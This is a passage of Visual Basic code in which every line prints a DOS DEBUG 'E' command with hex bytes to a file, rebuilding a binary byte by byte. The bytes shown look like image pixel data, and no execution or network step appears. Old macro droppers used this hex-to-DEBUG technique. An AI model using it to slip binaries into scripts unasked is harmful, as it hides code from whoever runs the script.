Print #hFile, "E 6410 81 95 AE 6C 81 9C 69 7E 99 82 98 B1 4E 5F 79 39"
Print #hFile, "E 6420 4E 64 60 75 8B 6A 81 97 3D 54 6A 20 37 4D 4D 65"
Print #hFile, "E 6430 7B 6F 88 9C 85 9E B2 69 82 96 4D 66 7A 2F 48 5C"
Print #hFile, "E 6440 43 5B 71 66 7E 94 5B 71 8A 48 5E 77 44 59 74 3C"
Print #hFile, "E 6450 51 6C 4B 5C 77 5E 6D 87 78 85 9B 90 9A AC B9 C1"
Print #hFile, "E 6460 CE D5 DB E6 D6 D8 E2 DD DF E7 CE D0 DA B1 B5 C0"
Print #hFile, "E 6470 97 9B AD 7B 84 98 53 5E 79 4B 5A 7A 68 78 9C 6E"
Print #hFile, "E 6480 80 A5 71 81 A6 6D 7D A2 66 77 9E 62 73 9A 5F 6F"
Print #hFile, "E 6490 99 5D 6D 97 58 68 92 54 64 8E 54 65 90 56 68 91"
Print #hFile, "E 64A0 54 68 91 53 68 8E 4F 64 8A 4D 63 87 4D 63 87 4E"
Print #hFile, "E 64B0 64 88 4F 61 86 50 62 87 51 62 89 4E 5F 86 47 58"
Print #hFile, "E 64C0 7F 3F 50 77 39 4A 71 35 46 6D 2D 3E 65 3F 51 76"
Print #hFile, "E 64D0 33 46 69 23 36 57 2F 43 62 35 4A 66 39 4E 69 4B"
Print #hFile, "E 64E0 60 7B 3C 50 69 4C 61 77 4E 63 79 42 5A 6E 23 38"
Print #hFile, "E 64F0 4D 19 31 43 2C 44 56 52 6A 7C 71 8B 9C 5B 75 86"
Print #hFile, "E 6500 6E 88 99 5F 79 89 46 60 70 66 80 90 76 91 9F 67"
Print #hFile, "E 6510 81 91 3E 56 68 24 3C 4E 2B 43 55 36 4E 60 31 47"
Print #hFile, "E 6520 59 29 3F 51 2E 45 55 41 58 68 6F 83 94 6E 82 93"
Print #hFile, "E 6530 55 6A 79 35 4A 59 70 83 92 69 7C 8B 72 85 92 92"
Print #hFile, "E 6540 A5 B2 90 A3 B2 64 78 89 3D 55 67 57 6E 7E 74 84"
Print #hFile, "E 6550 90 00 0C 13 00 00 F9 F9 F9 EC EC EC DF DF DF CD"
Print #hFile, "E 6560 CF CF C1 C2 C6 B1 B5 BA 00 00 09 B0 BB C9 AD BC"
Print #hFile, "E 6570 CF 86 98 AF 87 9B B4 84 99 B4 60 75 90 76 8C A5"
Print #hFile, "E 6580 6D 7E 98 43 58 6E 56 6A 83 52 68 81 37 4D 66 2C"
Print #hFile, "E 6590 43 59 52 69 7F 7F 96 AC 87 9F B3 50 68 7C 39 52"
Print #hFile, "E 65A0 66 40 59 6D 63 7B 91 50 68 7E 2F 47 5F 42 5A 72"
Print #hFile, "E 65B0 48 5F 79 38 4F 69 4F 63 7C 4A 5C 73 61 70 83 79"
Print #hFile, "E 65C0 86 96 9A A3 B1 C2 C8 D3 D0 D2 DC CA CC D6 CE D0"
Print #hFile, "E 65D0 DB AA AD BB 8B 92 A3 64 6D 81 4B 58 72 60 72 8F"
Print #hFile, "E 65E0 74 87 A8 6E 81 A6 76 87 AE 79 88 AF 78 88 B2 77"
Print #hFile, "E 65F0 87 B1 71 81 AC 6A 7A A5 64 74 9F 62 72 9D 5D 6D"
Print #hFile, "E 6600 9B 60 71 9C 5F 72 9D 5C 70 99 56 6A 93 4F 64 8A"
Print #hFile, "E 6610 4B 60 86 49 5E 84 4A 5B 82 4C 5D 84 4E 5F 86 4E"
Print #hFile, "E 6620 5F 86 49 59 83 41 51 7B 38 48 72 32 43 6A 2A 3B"
Print #hFile, "E 6630 62 36 48 6D 35 48 6B 29 3C 5D 29 3D 5C 36 4B 67"
Print #hFile, "E 6640 39 4E 69 30 45 60 4F 65 7E 4F 65 7E 51 67 80 45"
Print #hFile, "E 6650 5D 73 1B 32 48 1E 37 4B 40 59 6D 5F 78 8C 6B 85"
Print #hFile, "E 6660 96 59 73 84 6B 85 95 5A 75 83 47 62 70 6D 88 96"
Print #hFile, "E 6670 7A 95 A3 67 81 91 2E 46 58 20 38 4C 2B 43 55 3A"
Print #hFile, "E 6680 52 64 44 5A 6C 42 58 6A 34 4B 5B 31 48 58 73 87"
Print #hFile, "E 6690 98 68 7C 8D 59 6E 7D 35 4A 59 6B 7E 8D 80 93 A2"
Print #hFile, "E 66A0 8A 9D AC 99 AC BB 86 9B AA 46 5D 6D 57 71 82 8B"
Print #hFile, "E 66B0 A4 B4 84 96 A1 00 00 08 00 00 F8 F8 F8 EF EF EF"
Print #hFile, "E 66C0 E1 E1 E1 CC CE CE C2 C3 C7 B1 B5 BA 00 00 08 B0"
Print #hFile, "E 66D0 BB C9 B9 C8 DB 99 AB C2 80 94 AD B1 C6 E1 88 9D"
Print #hFile, "E 66E0 B8 73 89 A2 8A 9B B5 6B 7F 98 66 7B 96 4D 62 7D"
Print #hFile, "E 66F0 3C 51 6C 37 4D 66 55 6C 82 89 A0 B6 7D 95 A9 3F"
Print #hFile, "E 6700 57 6B 38 51 65 63 7C 90 60 78 8E 2D 45 5B 36 4E"
Print #hFile, "E 6710 66 4C 66 7E 3B 54 6E 40 5A 72 3F 56 6C 32 45 5A"
Print #hFile, "E 6720 42 53 66 5D 6C 7C 7B 84 92 A9 AF BC C5 C9 D4 C2"
Print #hFile, "E 6730 C4 CE C7 C9 D4 A7 AA B8 77 7E 8F 53 5E 72 5D 6C"
Print #hFile, "E 6740 86 70 82 9F 6E 83 A3 76 89 AE 80 90 BA 83 90 BC"
Print #hFile, "E 6750 84 93 C1 84 93 C1 7F 8E BC 7A 88 B8 7A 88 B8 7E"
Print #hFile, "E 6760 8C BC 6D 7D AC 6F 7F AD 6D 80 AD 69 7C A7 62 75"
Print #hFile, "E 6770 A0 58 6C 95 4F 63 8C 4C 5F 85 4A 5B 82 49 5A 81"
Print #hFile, "E 6780 47 58 7F 46 57 7E 44 54 7E 3F 4F 79 38 48 72 33"
Print #hFile, "E 6790 43 6D 2B 3C 63 25 37 5C 36 48 6D 33 46 67 1A 2D"
Print #hFile, "E 67A0 4E 2A 3E 5D 3F 54 70 2C 41 5C 45 5B 74 50 68 80"
Print #hFile, "E 67B0 4A 62 7A 3D 55 6D 20 38 50 20 38 4E 3B 53 69 69"
Print #hFile, "E 67C0 82 96 66 80 91 5C 76 86 67 82 90 53 6E 7C 4D 68"
Print #hFile, "E 67D0 76 73 8E 9C 76 91 9F 60 7A 8A 28 40 52 23 3B 4F"
Print #hFile, "E 67E0 2E 46 58 39 51 63 48 5E 70 4E 64 76 3B 52 62 2A"
Print #hFile, "E 67F0 41 51 6C 80 91 5F 73 84 59 6E 7D 48 5D 6C 69 7C"
Print #hFile, "E 6800 8B 94 A7 B6 98 AB BA 8C 9F AE 56 6B 7A 45 5C 6C"
Print #hFile, "E 6810 6F 88 9C 80 9A AB 69 7C 89 00 00 08 00 00 F5 F5"
Print #hFile, "E 6820 F5 EF EF EF E1 E1 E1 CB CD CD C3 C4 C8 B4 B8 BD"
Print #hFile, "E 6830 00 00 08 AE B9 C7 A7 B6 C9 A2 B4 CB 86 9A B3 B7"
Print #hFile, "E 6840 CC E7 A2 B7 D2 80 96 AF 7A 8B A5 7E 92 AB 60 75"
Print #hFile, "E 6850 91 41 57 73 3A 4F 6A 38 4E 67 56 6D 83 86 9D B3"
Print #hFile, "E 6860 5C 74 88 2A 42 56 4A 63 77 67 80 94 3C 55 69 2C"
Print #hFile, "E 6870 44 5A 53 6D 85 44 5E 76 27 40 5A 3C 56 6E 31 49"
Print #hFile, "E 6880 5D 2A 40 52 33 45 56 4C 5B 6B 69 72 80 8F 95 A2"
Print #hFile, "E 6890 B6 BA C5 C3 C5 D0 B9 BC CA 9F A4 B3 64 6B 7E 5A"
Print #hFile, "E 68A0 65 7B 73 83 9A 6D 82 9D 6D 85 A3 7B 91 B4 80 90"
Print #hFile, "E 68B0 BB 7F 8C BA 7C 8A BA 7D 8B BB 7D 8B BB 7C 8A BB"
Print #hFile, "E 68C0 80 8E BF 86 94 C5 80 8F C0 7F 8E BF 7B 8D BC 76"
Print #hFile, "E 68D0 89 B6 6F 82 AF 65 78 A3 5B 6E 99 56 68 91 51 62"
Print #hFile, "E 68E0 89 4D 5C 83 48 56 80 46 54 7E 46 54 7E 44 52 7C"
Print #hFile, "E 68F0 3D 4B 75 37 45 6F 2E 3D 64 24 34 59 33 43 68 37"
Print #hFile, "E 6900 48 69 1D 2E 4F 19 2B 4A 33 45 62 3E 53 6E 31 47"
Print #hFile, "E 6910 60 4C 64 7C 46 5D 77 39 53 6B 24 3E 56 19 34 49"
Print #hFile, "E 6920 29 44 59 64 7F 93 64 7E 8F 63 7D 8D 67 81 8F 4F"
Print #hFile, "E 6930 69 77 54 70 7B 77 93 9E 6B 86 94 51 6B 7B 30 48"
Print #hFile, "E 6940 5A 27 3F 53 36 4E 62 3F 57 6B 45 5B 6D 4E 64 76"
Print #hFile, "E 6950 41 57 69 2F 45 57 65 79 8A 57 6B 7C 4F 63 74 5A"
Print #hFile, "E 6960 6E 7F 64 77 86 9A AD BC 90 A3 B2 6E 81 90 41 55"
Print #hFile, "E 6970 66 6C 83 93 80 9B AF 73 8D 9E 72 85 92 00 07 0F"
Print #hFile, "E 6980 00 00 F1 F0 F2 EF EF EF E1 E1 E1 CA CC CD C1 C5"
Print #hFile, "E 6990 C6 B6 BA BF 00 00 07 AC B7 C5 B2 C0 D2 B5 C8 DD"
Print #hFile, "E 69A0 95 A9 C2 9A B0 C9 AE C3 DE AC C2 DB 64 79 8F 74"
Print #hFile, "E 69B0 88 A1 5F 75 91 40 56 72 39 4E 69 34 4A 63 58 6F"
Print #hFile, "E 69C0 85 87 9E B4 4F 67 7B 30 48 5C 65 7C 92 51 69 7F"
Print #hFile, "E 69D0 21 39 4F 3A 52 68 4D 65 7D 30 48 60 31 49 61 2A"
Print #hFile, "E 69E0 42 58 25 3F 50 29 42 52 27 3B 4C 39 49 5A 53 5D"
Print #hFile, "E 69F0 6E 6B 73 80 94 98 A3 AF B3 BE B0 B3 C1 94 9B AA"
Print #hFile, "E 6A00 59 62 76 67 73 8B 77 88 A2 68 7A 97 7C 90 AF 7F"
Print #hFile, "E 6A10 92 B5 94 A1 CD 8C 98 C8 84 92 C3 84 92 C3 84 91"
Print #hFile, "E 6A20 C5 83 90 C4 84 90 C6 87 93 C9 8D 9B CF 8A 98 CC"
Print #hFile, "E 6A30 85 94 C5 7E 90 BF 78 8A B9 6F 81 B0 65 77 A6 60"
Print #hFile, "E 6A40 70 9E 56 66 91 51 61 8C 4D 5A 86 4A 5A 85 4C 5C"
Print #hFile, "E 6A50 86 48 58 82 3F 50 77 36 47 6E 2C 3E 63 2B 3D 62"
Print #hFile, "E 6A60 29 3C 5F 32 43 64 2A 3C 5B 0E 20 3F 1B 2D 4A 51"
Print #hFile, "E 6A70 63 80 2C 41 5C 4B 63 7B 4D 66 80 46 60 78 2B 45"
Print #hFile, "E 6A80 5D 17 32 47 25 40 55 60 7B 8F 65 7F 90 68 82 92"
Print #hFile, "E 6A90 68 81 91 4D 67 75 59 74 82 79 94 A2 61 7B 8B 45"
Print #hFile, "E 6AA0 5F 6F 35 4E 62 29 41 55 41 59 6D 50 68 7C 4A 60"
Print #hFile, "E 6AB0 72 4C 62 74 44 5A 6C 31 47 59 66 7C 8E 55 6C 7C"
Print #hFile, "E 6AC0 45 5C 6C 63 7A 8A 60 75 84 99 AC BB 84 97 A6 57"
Print #hFile, "E 6AD0 69 7A 68 7E 90 8A A2 B4 72 8A 9E 6D 83 95 86 99"
Print #hFile, "E 6AE0 A6 00 03 0C 00 00 F4 F5 F9 EB ED EE D8 DA DB CD"
Print #hFile, "E 6AF0 CF D0 BD C1 C2 B5 BA BD 00 01 08 BA C3 D0 D9 E8"
Print #hFile, "E 6B00 F8 CA DB EE 9A AF C5 93 AA C0 9D B5 CD A8 BF D5"
Print #hFile, "E 6B10 A4 BB D1 6C 83 99 61 7A 94 34 4D 67 44 5C 74 22"
Print #hFile, "E 6B20 39 4F 6F 84 9A 84 99 AE 48 5D 72 4B 62 78 64 7A"
Print #hFile, "E 6B30 93 26 3C 55 32 4A 62 43 5B 73 45 5B 74 39 4D 66"
Print #hFile, "E 6B40 2E 43 59 2C 41 56 23 3C 4C 25 40 4E 2F 47 59 13"
Print #hFile, "E 6B50 29 3B 3D 4D 5E 51 5B 6C 7B 84 8E 9B A2 AB 9B A1"
Print #hFile, "E 6B60 AC 83 8C 9A 67 74 8A 63 72 8C 6C 7B 9B 71 80 A1"
Print #hFile, "E 6B70 7C 88 AA 8E 9A BE 9C A7 D3 90 9C CC 88 93 C5 86"
Print #hFile, "E 6B80 91 C5 88 91 CA 89 91 CC 8A 95 CF 8E 99 D2 91 9D"
Print #hFile, "E 6B90 D3 8C 9A CE 86 95 C6 7F 8E BF 77 86 B7 6F 7D B1"
Print #hFile, "E 6BA0 68 76 AA 63 71 A5 5A 69 9A 4E 5E 8D 46 54 84 48"
Print #hFile, "E 6BB0 58 86 4D 5E 89 4B 5E 84 43 56 7B 3C 50 73 2A 3F"
Print #hFile, "E 6BC0 5F 20 35 55 21 36 55 30 44 63 2A 3C 59 22 34 51"
Print #hFile, "E 6BD0 24 34 51 4B 5D 7A 40 55 70 36 4D 67 52 6A 82 43"
Print #hFile, "E 6BE0 5B 73 3A 52 6A 1C 34 4A 2B 44 58 5D 77 88 68 82"
Print #hFile, "E 6BF0 93 63 7D 8E 63 7D 8E 53 6D 7E 65 7F 90 7C 96 A7"
Print #hFile, "E 6C00 5E 78 89 42 5B 6F 13 2C 40 31 49 5F 45 5E 72 5B"
Print #hFile, "E 6C10 74 88 3F 57 6B 52 6A 7E 45 5D 71 38 52 63 5D 77"
Print #hFile, "E 6C20 88 51 6D 7E 52 6C 7C 6B 84 94 73 8A 9A A1 B5 C6"
Print #hFile, "E 6C30 7D 8F A0 5F 73 85 77 8F A3 75 8D A1 54 68 7A 7A"
Print #hFile, "E 6C40 8A 9B BA C7 D5 00 00 0A 00 00 F5 F6 FA EC ED F1"
Print #hFile, "E 6C50 DA DC DD CF D1 D2 BE C2 C3 B4 B9 BC 00 00 06 BA"
Print #hFile, "E 6C60 C4 CE D5 E2 F0 D0 E2 F3 AA BF D4 9E B5 CB A6 BE"
Print #hFile, "E 6C70 D4 A7 BF D5 A8 C0 D4 95 AD C3 5B 75 8D 31 4B 63"
Print #hFile, "E 6C80 41 59 71 2E 45 5B 70 85 9A 71 86 9B 46 5B 70 56"
Print #hFile, "E 6C90 6B 81 4E 64 7D 2B 40 5B 3A 51 6B 3C 53 6D 3F 53"
Print #hFile, "E 6CA0 6C 3B 50 66 35 45 5C 29 3D 4F 1C 33 42 18 32 40"
Print #hFile, "E 6CB0 25 3D 4F 11 26 3B 30 41 56 3D 49 5B 6A 72 7F 8F"
Print #hFile, "E 6CC0 95 A0 8B 93 A0 75 7F 90 64 74 8B 66 78 95 6D 7E"
Print #hFile, "E 6CD0 9F 72 80 A4 7E 87 AC 88 91 B7 8B 97 C1 86 93 BF"
Print #hFile, "E 6CE0 82 8E BE 7E 89 BD 7B 84 BD 7A 83 BC 79 82 BB 77"
Print #hFile, "E 6CF0 83 B9 7E 8B BF 84 92 C3 89 97 C7 86 96 C4 7C 8C"
Print #hFile, "E 6D00 BB 70 80 AF 67 76 A7 63 71 A5 5D 6B 9F 53 62 93"
Print #hFile, "E 6D10 49 59 88 46 56 84 47 5A 85 48 5C 85 44 5A 7E 3F"
Print #hFile, "E 6D20 55 78 32 49 69 1F 37 55 1E 33 52 31 47 63 2D 3F"
Print #hFile, "E 6D30 5C 1F 31 4E 1C 2C 49 41 53 70 49 5E 79 35 4C 66"
Print #hFile, "E 6D40 4E 66 7E 46 5E 76 43 5B 71 26 3F 53 28 41 55 56"
Print #hFile, "E 6D50 70 81 64 7E 8F 5F 79 8A 62 7C 8D 54 6E 7F 72 8B"
Print #hFile, "E 6D60 9F 7C 95 A9 50 69 7D 2B 44 58 1D 38 4D 34 4F 64"
Print #hFile, "E 6D70 51 6A 7E 5F 78 8C 42 5A 6E 5E 76 8A 4E 67 7B 38"
Print #hFile, "E 6D80 53 67 53 6F 80 59 77 88 57 74 83 65 7F 8F 6D 86"
Print #hFile, "E 6D90 96 97 AB BC 7A 8C 9D 6C 80 92 6C 84 9A 7A 92 A8"
Print #hFile, "E 6DA0 86 95 A8 A9 B6 C6 C2 CC DD 00 04 12 00 00 F5 F7"
Print #hFile, "E 6DB0 F8 EC EE EF DC DE DF D0 D2 D3 C1 C3 C4 B5 B8 BC"
Print #hFile, "E 6DC0 00 00 04 BE C9 D1 D1 DE EC D2 E4 F5 B5 CA DF 9E"
Print #hFile, "E 6DD0 B5 CB A2 B9 CF 9E B5 CB 96 AE C2 9E B6 CC 5D 77"
Print #hFile, "E 6DE0 8F 35 4F 67 3C 54 6C 3B 52 68 75 8A 9F 63 78 8D"
Print #hFile, "E 6DF0 47 5C 71 57 6C 82 38 4E 67 30 45 60 3E 55 6F 31"
Print #hFile, "E 6E00 48 62 3B 4F 68 41 56 6C 35 45 5C 20 31 44 19 2D"
Print #hFile, "E 6E10 3E 10 27 37 22 37 4C 17 2A 3F 23 31 47 26 2F 43"
Print #hFile, "E 6E20 4F 56 65 79 7F 8C 74 7B 8A 63 6F 81 5B 6C 86 61"
Print #hFile, "E 6E30 75 94 6A 7D A0 79 89 AE 84 8F B5 7E 89 AF 75 82"
Print #hFile, "E 6E40 A8 6C 78 A0 5B 66 92 47 51 80 3A 43 75 3A 45 77"
Print #hFile, "E 6E50 46 51 83 51 5D 8D 51 5E 8C 5E 6E 98 72 83 AA 7C"
Print #hFile, "E 6E60 8E B3 7C 8D B4 77 88 AF 73 83 AD 72 82 AD 62 72"
Print #hFile, "E 6E70 A1 57 66 97 4A 5A 89 44 54 82 43 56 81 46 5A 83"
Print #hFile, "E 6E80 46 5B 81 46 5C 80 3D 53 76 23 3A 5A 1A 2F 4E 31"
Print #hFile, "E 6E90 47 63 31 43 60 1D 30 4B 13 24 3F 32 45 60 54 69"
Print #hFile, "E 6EA0 84 36 4D 67 4A 62 7A 4A 62 7A 4D 65 7B 34 4D 61"
Print #hFile, "E 6EB0 27 40 54 4E 68 79 61 7B 8C 5C 76 87 62 7C 8D 57"
Print #hFile, "E 6EC0 71 82 7D 96 AA 70 89 9D 3E 57 6B 1A 33 47 26 41"
Print #hFile, "E 6ED0 56 3D 58 6D 62 7B 8F 5D 76 8A 3D 55 69 63 7B 8F"
Print #hFile, "E 6EE0 55 6E 82 3F 5A 6E 4B 67 78 5B 79 8A 56 73 82 5F"
Print #hFile, "E 6EF0 79 89 6D 86 96 93 A7 B8 7F 91 A2 7D 91 A3 88 A0"
Print #hFile, "E 6F00 B6 93 AB C1 AF C0 D3 B7 C6 D6 C6 D3 E3 00 00 0B"
Print #hFile, "E 6F10 00 00 F5 F7 F8 EB ED EE DC DE DF CF D1 D2 C1 C3"
Print #hFile, "E 6F20 C4 B4 B7 BB 00 00 04 CA D3 DC C6 D3 E1 C7 D9 EA"
Print #hFile, "E 6F30 B9 CE E3 9B B2 C8 98 AF C5 9F B6 CC 94 AC C0 8E"
Print #hFile, "E 6F40 A6 BC 66 80 98 3F 59 71 38 50 68 3F 56 6C 79 8E"
Print #hFile, "E 6F50 A3 63 78 8D 50 65 7A 4B 60 76 32 48 61 34 49 64"
Print #hFile, "E 6F60 3B 52 6C 2C 43 5D 3F 53 6C 43 58 6E 30 40 57 16"
Print #hFile, "E 6F70 27 3C 1A 2B 3E 15 26 39 2B 3C 51 22 30 47 18 23"
Print #hFile, "E 6F80 39 12 1B 2F 35 3C 4D 59 60 71 5F 66 79 5D 68 7E"
Print #hFile, "E 6F90 59 69 86 5A 6E 91 69 7C A2 7C 8F B5 7D 8C B3 6C"
Print #hFile, "E 6FA0 78 A0 54 60 88 4E 5A 84 43 4E 7A 37 41 71 2B 34"
Print #hFile, "E 6FB0 66 27 30 62 31 3A 6C 3C 48 78 3B 48 74 44 53 7A"
Print #hFile, "E 6FC0 4F 5F 84 56 69 8C 5E 70 95 69 7B A0 76 88 AD 80"
Print #hFile, "E 6FD0 90 BA 68 78 A6 56 66 95 46 56 85 45 55 83 45 58"
Print #hFile, "E 6FE0 85 45 58 83 46 5A 83 4A 5F 85 44 5A 7E 29 3F 62"
Print #hFile, "E 6FF0 19 2E 4E 2E 43 62 32 44 61 20 33 4E 11 22 3C 22"
Print #hFile, "E 7000 36 4F 57 6C 87 3B 52 6C 4B 63 7B 4D 65 7D 4F 67"
Print #hFile, "E 7010 7D 40 59 6D 2A 43 57 49 63 74 61 7B 8C 59 73 84"
Print #hFile, "E 7020 63 7D 8E 5F 79 8A 7E 97 AB 5A 73 87 2F 48 5C 1F"
Print #hFile, "E 7030 38 4C 30 4B 60 47 62 77 65 7E 92 4C 65 79 37 4F"
Print #hFile, "E 7040 63 63 7B 8F 53 6C 80 43 5E 72 4C 68 79 4F 6D 7E"
Print #hFile, "E 7050 50 6D 7C 60 7A 8A 73 8C 9C 98 AC BD 8E A0 B1 88"
Print #hFile, "E 7060 9C AE 8B A3 B9 9A B2 C8 AF C0 D3 BB CA DA B6 C3"
Print #hFile, "E 7070 D1 00 00 0B 00 00 F5 F7 F8 EA EC ED DD DD DD CF"
Print #hFile, "E 7080 CF CF C0 C2 C3 B4 B7 BB 00 01 06 D9 E2 EB C3 D0"
Print #hFile, "E 7090 DE C7 D7 E8 D0 E4 F6 B2 C7 DC 95 AC C2 A5 BC D2"
Print #hFile, "E 70A0 A5 BA CF 86 9D B3 63 7D 95 43 5D 75 37 4F 67 39"
Print #hFile, "E 70B0 50 66 73 88 9D 65 7A 8F 5A 6F 84 3F 54 6A 34 4A"
Print #hFile, "E 70C0 63 37 4C 67 39 50 6A 2E 45 5F 42 56 6F 3A 4F 65"
Print #hFile, "E 70D0 25 35 4C 16 27 3C 17 25 3B 19 27 3D 30 3E 55 23"
Print #hFile, "E 70E0 2F 47 0C 14 2B 07 0E 22 21 27 3A 3E 44 57 53 5C"
Print #hFile, "E 70F0 70 5E 69 84 5C 6E 8D 5B 6E 93 65 79 A2 70 84 AD"
Print #hFile, "E 7100 6B 7B A5 5F 6C 98 6D 77 A7 5B 62 94 48 4E 83 3F"
Print #hFile, "E 7110 44 7B 3B 3F 79 38 3F 78 40 47 80 4B 52 89 52 5B"
Print #hFile, "E 7120 8D 52 5F 8D 52 5F 8B 4F 5D 87 4F 5E 85 59 68 8F"
Print #hFile, "E 7130 6D 7C A3 7A 8A B4 69 7A A5 52 62 90 44 54 82 4A"
Print #hFile, "E 7140 5A 88 4D 60 8D 48 5B 88 45 58 85 4A 5D 88 44 58"
Print #hFile, "E 7150 81 31 46 6C 1C 30 53 29 3E 5E 30 42 5F 27 3B 54"
Print #hFile, "E 7160 15 27 3E 16 2B 41 4E 64 7D 40 57 71 4D 65 7D 4E"
Print #hFile, "E 7170 66 7E 4B 63 79 46 5F 73 31 4A 5E 4A 64 75 61 7B"
Print #hFile, "E 7180 8C 53 6D 7E 61 7B 8C 70 8A 9B 7C 95 A9 4A 63 77"
Print #hFile, "E 7190 28 41 55 2B 44 58 3F 5A 6F 57 72 87 60 79 8D 3A"
Print #hFile, "E 71A0 53 67 3B 53 67 62 7A 8E 50 69 7D 4A 65 79 53 6F"
Print #hFile, "E 71B0 80 42 60 71 53 70 7F 69 83 93 77 90 A0 9A AE BF"
Print #hFile, "E 71C0 9A AC BD 8B 9F B1 94 AC C2 9F B6 CC 9E B0 C1 A7"
Print #hFile, "E 71D0 B6 C6 70 7D 8B 00 00 0B 00 00 F6 F8 F9 E9 EB EC"
Print #hFile, "E 71E0 DD DD DD CD CD CD BF C1 C2 B3 B7 B8 00 02 07 E4"
Print #hFile, "E 71F0 ED F6 C4 D1 DF C4 D4 E5 DA EE FF CC E1 F6 9A B1"
Print #hFile, "E 7200 C7 9D B5 C9 AF C4 D9 8D A4 BA 5A 74 8C 42 5C 74"
Print #hFile, "E 7210 39 51 69 34 4B 61 66 7B 90 61 76 8B 5D 72 87 3B"
Print #hFile, "E 7220 50 66 37 4D 66 3A 4F 6A 3A 51 6B 31 48 62 3E 52"
Print #hFile, "E 7230 6B 2C 41 57 1D 2D 44 19 2A 3F 11 1E 34 19 26 3C"
Print #hFile, "E 7240 2B 38 4E 1C 27 3D 00 06 1D 00 05 19 12 17 2C 2A"
Print #hFile, "E 7250 31 45 52 59 72 5E 6A 86 5C 6D 8E 55 68 8E 5A 6E"
Print #hFile, "E 7260 97 62 75 A0 64 76 9F 68 75 A3 53 5A 91 41 44 81"
Print #hFile, "E 7270 2D 2F 6F 27 29 69 27 29 6A 26 28 68 24 26 66 22"
Print #hFile, "E 7280 27 64 3E 45 7E 49 51 86 56 5F 91 5A 67 95 59 66"
Print #hFile, "E 7290 94 57 64 90 58 65 91 5B 68 94 62 72 9D 52 63 8E"
Print #hFile, "E 72A0 4D 5D 8B 55 65 93 55 67 96 4C 5E 8D 47 58 89 4B"
Print #hFile, "E 72B0 5D 8C 44 57 84 39 4D 76 20 33 58 25 3A 5A 2D 3F"
Print #hFile, "E 72C0 5C 2C 40 59 1C 2F 44 10 25 3A 41 57 70 40 57 71"
Print #hFile, "E 72D0 4A 62 7A 50 68 80 49 61 77 48 61 75 37 50 64 4D"
Print #hFile, "E 72E0 67 78 5D 77 88 4D 67 78 61 7B 8C 85 9F B0 74 8D"
Print #hFile, "E 72F0 A1 43 5C 70 27 40 54 34 4D 61 49 64 79 6A 85 9A"
Print #hFile, "E 7300 62 7B 8F 3A 53 67 4A 62 76 5D 75 89 50 69 7D 55"
Print #hFile, "E 7310 70 84 53 6F 80 3E 5C 6D 62 7F 8E 70 8A 9A 75 8E"
Print #hFile, "E 7320 9E 96 AA BB 9B AD BE 8D 9E B1 89 A0 B6 92 A7 BC"
Print #hFile, "E 7330 AB BB CC 89 96 A4 52 5D 6B 00 04 12 00 00 F8 F7"
Print #hFile, "E 7340 F9 EB EA EC DF DF DF CF CF CF C3 C3 C3 B5 B7 B8"
Print #hFile, "E 7350 00 00 05 E8 F2 F9 C6 D4 E0 B3 C3 D3 C0 D4 E6 D5"
Print #hFile, "E 7360 EA FF AA BF D4 94 A9 BE AE C3 D8 9D B5 C9 62 7C"
Print #hFile, "E 7370 94 43 5D 75 41 59 71 38 4F 65 62 77 8C 5C 71 86"
Print #hFile, "E 7380 59 6E 83 3D 52 68 39 4F 68 3C 51 6C 39 50 6A 2D"
Print #hFile, "E 7390 44 5E 37 4B 64 25 3A 50 1C 2C 43 18 29 3E 16 23"
Print #hFile, "E 73A0 39 1E 2B 41 27 32 48 15 20 34 00 00 11 00 00 12"
Print #hFile, "E 73B0 05 0C 20 20 28 3F 54 5D 78 60 6E 8B 5E 6E 92 50"
Print #hFile, "E 73C0 63 89 54 66 8F 64 76 9F 66 76 A0 5C 68 98 28 2A"
Print #hFile, "E 73D0 6A 38 36 7C 45 42 8A 4D 4A 92 52 4F 97 51 50 98"
Print #hFile, "E 73E0 4A 4A 90 41 42 86 16 18 58 1C 22 5D 2D 34 6D 46"
Print #hFile, "E 73F0 4D 84 5B 63 98 65 6E A0 61 6B 9B 59 66 94 53 63"
Print #hFile, "E 7400 8D 57 69 92 5E 6F 9A 62 72 A0 5B 6D 9C 52 63 94"
Print #hFile, "E 7410 4C 5D 90 4C 5D 8E 46 58 87 40 53 7E 25 38 5E 25"
Print #hFile, "E 7420 3A 5A 2C 3E 5B 2E 43 59 1F 33 45 0F 24 39 34 4A"
Print #hFile, "E 7430 63 3B 52 6C 42 5A 72 54 6C 84 4C 64 7A 49 62 76"
Print #hFile, "E 7440 3B 54 68 4F 69 7A 55 6F 80 4D 67 78 66 80 91 95"
Print #hFile, "E 7450 AF C0 61 7A 8E 3A 53 67 2A 43 57 3F 58 6C 53 6E"
Print #hFile, "E 7460 83 74 8F A4 5C 75 89 40 59 6D 60 78 8C 60 78 8C"
Print #hFile, "E 7470 52 6B 7F 53 6E 82 4A 66 77 42 60 71 6D 8A 99 6A"
Print #hFile, "E 7480 84 94 72 8B 9B 96 AA BB 96 A8 B9 8F A0 B3 87 9A"
Print #hFile, "E 7490 AF 94 A5 BA 92 9E B0 49 52 60 3F 48 56 00 00 0A"
Print #hFile, "E 74A0 00 00 F8 F7 F9 EC EC EC E1 E1 E1 D1 D1 D1 C4 C4"
Print #hFile, "E 74B0 C4 B4 B6 B7 00 00 03 EA F2 F9 DF EB F7 AE BE CE"
Print #hFile, "E 74C0 A6 BA CC D5 EA FF BB D0 E5 8D A2 B7 A1 B7 C9 9D"
Print #hFile, "E 74D0 B5 C9 73 8D A5 49 63 7B 48 60 78 40 57 6D 65 7A"
Print #hFile, "E 74E0 8F 5B 70 85 54 69 7E 3E 53 69 3A 50 69 3D 52 6D"
Print #hFile, "E 74F0 35 4C 66 25 3C 56 31 45 5E 28 3D 53 1F 2F 46 12"
Print #hFile, "E 7500 23 38 20 2E 44 25 33 46 27 33 45 13 1F 31 00 00"
Print #hFile, "E 7510 0D 00 00 0D 00 06 19 1D 25 3C 56 61 7C 68 76 93"
Print #hFile, "E 7520 6A 7A 9E 57 69 8E 58 69 90 6E 7E A8 5F 6F 99 33"
Print #hFile, "E 7530 3F 6F 4C 4E 8E 5B 58 A0 53 50 98 33 30 78 1F 1C"
Print #hFile, "E 7540 64 29 26 6E 3B 3B 81 44 45 89 64 66 A7 4B 4E 8B"
Print #hFile, "E 7550 31 37 72 33 3A 71 4B 53 88 5D 66 98 5C 66 96 51"
Print #hFile, "E 7560 5E 8C 47 57 81 5C 6E 97 6D 7E A9 6B 7B AA 5D 6E"
Print #hFile, "E 7570 9F 55 66 99 51 61 96 4E 5E 93 48 59 8A 44 57 84"
